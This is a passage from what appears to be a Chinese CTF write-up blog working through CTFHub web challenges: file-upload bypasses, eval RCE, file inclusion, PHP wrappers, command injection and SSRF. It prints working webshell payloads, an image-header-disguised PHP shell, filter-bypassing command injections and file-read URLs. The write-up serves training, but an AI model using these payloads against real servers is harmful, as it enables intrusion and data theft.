$whitelist)) {        $des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) {            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;/script&gt;&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;/script&gt;&quot;;        }    } else {        echo &quot;文件类型不匹配&quot;;    }}</code></pre><p>$_FILES 解释（搬自php手册）<br>$_FILES 数组内容如下:</p><p>$_FILES【‘myFile’][‘name’] 客户端文件的原名称。</p><p>$_FILES【‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。</p><p>$_FILES【‘myFile’][‘size’] 已上传文件的大小，单位为字节。</p><p>$_FILES【‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</p><p>$_FILES【‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)</p><p>basename() 函数：返回路径中的文件名部分。<br>$_name 是上传的文件名加后缀<br>$_ext 得到的就是后缀名<br>重点就在 $des这个变量<br>得到的完整路径是 GET[‘road’]+随机数+日期加前面获得的后缀名看到这里基本可看出来，如果直接上传的话，文件是会被重新命名的，所以这里就有一个办法就是在</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51239_3.png" alt></p><p>这里为自己拟定一个文件名字，并且使用00截断后面自动生成的信息，这样就可以防止你上传的文件被认定为临时文件了</p><p>可以看到之前上传的文件都是被认定为临时文件：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51237_2.png" alt></p><p>最后上传的路径为/uoload/1.php然后一句话，一把梭</p><h5 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h5><p>直接不做修改的上传发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51248_4.png" alt></p><p>php没了！！！</p><p>所以这里关于绕过，而且明显告诉是双写，那就：</p><p>shell.pphphp</p><p>成功了，一把梭（关于怎么绕过要自己不断尝试，即可）</p><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>都说是文件头检查了，那肯定就是抓包啊</p><p>将文件改为这个</p><p>Content-Type: image/png</p><p>但是说我文件错误，是文件错误，那么就准备改文件，</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>把随便一个图片用hex打开发现他头部信息就是这个GIF89a</p><p>然后继续上传准备一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8812%E6%97%A51301_5.png" alt></p><p>success</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>eval():该函数可以把字符串作为PHP代码执行</li><li>$_REQUEST[’’]:和GET和POST类似，不过反应速度比较慢</li></ul><p>大体意思是：判断cmd是否被设置，若cmd被赋值，则执行如下语句，否则就继续显示以上代码。<br>方法一：</p><p>eval($_REQUEST[“cmd”]);</p><p>通过蚁剑直接连接，密码cmd</p><p>方法二：</p><p>构造URL：?cmd=system(“ls”);</p><p>发现了index.php</p><p>继续构造?cmd=system(“cd /;ls”);</p><p>得到：bin boot dev etc flag_30765 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p>构造：</p><p>?cmd=system(“cd /;cat flag_30765”);</p><p>success</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 关闭错误报告</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//strpos — 查找字符串首次出现的位置</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数解释：</p><pre><code>#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</code></pre><p>发现一个shell</p><pre><code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;预定义的 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据$_REQUEST 变量既可以收集GET方法发送的数据，也可以接受POST方法接受的数据</code></pre><p>直接蚁剑吧，发现是txt文件，没办法连接</p><p>因为题目给出：</p><p>i have a <a href="shell.txt">shell</a>, how to use it ?</p><p>所以构造参数：</p><p><a href="http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt" target="_blank" rel="noopener">http://challenge-799c3c5c6ecef465.sandbox.ctfhub.com:10080/?file=shell.txt</a></p><p>然后使用hackbar的postdata传参</p><p>ctfhub=system(‘ls’);</p><p>ctfhub=system(‘ls /‘);</p><p>ctfhub=system(‘cat /flag’);</p><p>得到flag</p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>题型：php伪协议</p><pre><code>php://input特点如下:1）、Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST2）、PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA3）、只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。填入的长度，由Coentent-Length指定。4）、只有Content-Type为application/x-www-data-urlencoded时，php://input数据才跟$_POST数据相一致。5）、php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini6）、PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。总结起来就是，在用$_POST获取不到由APP或者一些接口的回调数据时,就用php://input试试</code></pre><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//" ) {</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phpinfo.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>phpinfo<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个应该也是get传参，开头的格式也是?file=,也就是说先对你输入的文件的前六个字符进行判断，如果是php://的话就执行一个php文件，如果不是就gg</p><p>搜索了一下发现这是属于php伪协议的一种类型：</p><p>php://input 是个可以访问请求的数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>http:/xxx/index.php?file=php://input</code></pre><p>其他伪协议可见链接：</p><p> <a href="https://blog.csdn.net/qiuyeyijian/article/details/102993218?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control" target="_blank" rel="noopener">(很好的一个写给萌新wp的博主，更多伪协议见下方的推荐其他的文章)</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A51747_1.png" alt></p><p>然后则这样就可以了</p><p>补充一个语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"find / -name flag*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用这个找挺方便的</p><h5 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h5><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//" ) {</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，会显示规定要显示的文件</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>flag in <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span></span><span class="token operator">/</span>flag<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span> flag in <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上一题一样我感觉，但是并不好用</p><pre><code>resource=&lt;要过滤的数据流&gt;            指定了你要筛选过滤的数据流。    必选read=&lt;读链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选write=&lt;写链的筛选列表&gt;             可以设定一个或多个过滤器名称，以管道符（|）分隔。    可选&lt;；两个链的筛选列表&gt;               任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</code></pre><p>这里就不能将指令POST上去了，图中又提示了必须使用<code>php://</code>，FLAG在/flag内，因此想到过滤器filter</p><p>考虑到php伪协议里面的直接读取一个文件里面的内容的一个伪协议↓</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=/flag（有绝对路径的限制下时用）?file=php://filter/resource=/flag</code></pre><p>也可以去掉 <code>read</code>绕过一些限制函数</p><p>success</p><p>考查知识点：php://filter过滤器</p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phpinfo.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>phpinfo<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>i don't have shell<span class="token punctuation">,</span> how to get flag<span class="token operator">?</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也是：?file=来进行传参</p><p>让我看phpinfo文件，因为根据前面题总结的经验只要这个allow_url_include = On是开的就可以利用php://伪协议，点开phpinfo发现确实是开的，所以抓包试试，success</p><p>此题目和php://input做法一样</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$_GET['ip']}"</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入框打入：127.0.0.1;ls</p><p>得到</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token constant">PING</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">24024115330223</span><span class="token punctuation">.</span>php    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> index<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后输入：127.0.0.1;cat 24024115330223.php</p><p>页面没有显示，但是在源代码里面显示了flag</p><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/cat/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上一题目一样，只不过要防一下过滤</p><p>127.0.0.1;a=ca;b=t;$a$b flag_29869689610883.php</p><p>不错不错新思路</p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>在linux系统下：</p><p>1:&lt;&gt;  2:&lt;  3:${IFS}这三个均可以表示空格</p><p>所以</p><p>127.0.0.1;ls</p><p>127.0.0.1;cat&lt;flag_260652093720389.php</p><p>ybs</p><h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符:/\"></a>过滤目录分隔符:/\</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cd flag_is_here;ls</p><p>127.0.0.1;cd flag_is_here;cat flag_25394867112070.php</p><p>也不知道为什么过滤，就好像过滤了一个寂寞</p><h4 id="过滤运算符-amp"><a href="#过滤运算符-amp" class="headerlink" title="过滤运算符:/(||\&amp;)/"></a>过滤运算符:/(||\&amp;)/</h4><p>127.0.0.1;ls</p><p>127.0.0.1;cat flag_13087279769836.php</p><p>这又是一个寂寞</p><h4 id="综合过滤练习：-amp-cat-flag-ctfhub"><a href="#综合过滤练习：-amp-cat-flag-ctfhub" class="headerlink" title="综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/"></a>综合过滤练习：/(||&amp;|;| |\/|cat|flag|ctfhub)/</h4><p>提示：%0a(换行符) 、%0d(回车符)</p><p>在这里的输入框输入：</p><p>127.0.0.1%0als</p><p>会发现，%0a会被两次编码，所以直接在URL里面输入才算可以</p><p>考虑到在linux系统内shell执行的并不能识别url编码，那么这里得知可以使用hex16位编码来进行转换：</p><p>使用命令$(printf${IFS}”hex编码”)</p><p>127.0.0.1%0als&lt;$(printf${IFS}”\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65”)</p><p>得到文件：</p><p>flag_144233033911102.php</p><p>构造:</p><p>127.0.0.1;cat flag_is_here/flag_144233033911102.php</p><p>127.0.0.1%0aca’’t${IFS}$(printf${IFS}”\x66\x6C\x61\x67\x5F\x69\x73\x5F\x68\x65\x72\x65\x2F\x66\x6C\x61\x67\x5F\x31\x34\x34\x32\x33\x33\x30\x33\x33\x39\x31\x31\x31\x30\x32\x2E\x70\x68\x70”)</p><p>方法二：</p><p>%0acd%09f%27l%27ag_is_here%0atac%09fl%27a%27g_91124222386.php</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="扫盲："><a href="#扫盲：" class="headerlink" title="扫盲："></a>扫盲：</h3><h4 id="csrf初探："><a href="#csrf初探：" class="headerlink" title="csrf初探："></a>csrf初探：</h4><p><a href="https://www.cnblogs.com/jinjiangongzuoshi/p/7441715.html" target="_blank" rel="noopener">详细解说</a></p><p>自我理解：客户在带有网站a的cookie信息后，收到b站的恶意攻击代码，然后在客户机不知情的情况下，去a站执行了b站的要求，比如a站为qq邮箱，那么b站要求访问b站的客户在a站发送大量广告邮箱给你的邮箱好友列表，因为b站没有你在a站的cookie验证信息，所以不能直接利用客户机的cookie去执行，这就需要客户机主动请求这个恶意网站b，然后b站给你下达命令让你的客户机去执行发广告的这一个操作，这样a站会以为是客户需要进行这样的一个服务，所以就会乖乖的执行</p><h5 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h5><p>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</p><h4 id="ssrf初探："><a href="#ssrf初探：" class="headerlink" title="ssrf初探："></a>ssrf初探：</h4><p><a href="https://teamssix.com/year/191222-192227.html" target="_blank" rel="noopener">浅谈ssrf</a></p><p>自我理解：首先内网ip需要被外网访问的话需要内网穿透服务，而这个ssrf就恰巧是与内网穿透反其道而行之，他是通过请求目标机的上一层服务器来实现对该服务器下所有内网主机进行访问，比如你的电脑就是一个服务器，你通过nat开了好几个虚拟机，而你的电脑又拥有公网ip，这样你的虚拟机不可能被访问，但是物理机可以，那么通过发送一个来自你服务器的请求来操控虚拟机，就是一个ssrf攻击</p><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>题目信息：尝试访问位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><p>GG</p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>题目信息：尝试去读取一下Web目录下的flag.php吧</p><p>?url=file:///var/www/html/flag.php</p><p>查看源文件得flag</p><pre><code>URL伪协议：file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样dict://  Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628gopher://  Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了sftp://  Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作ldap://  LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议tftp://  TFTP（Trivial File Transfer 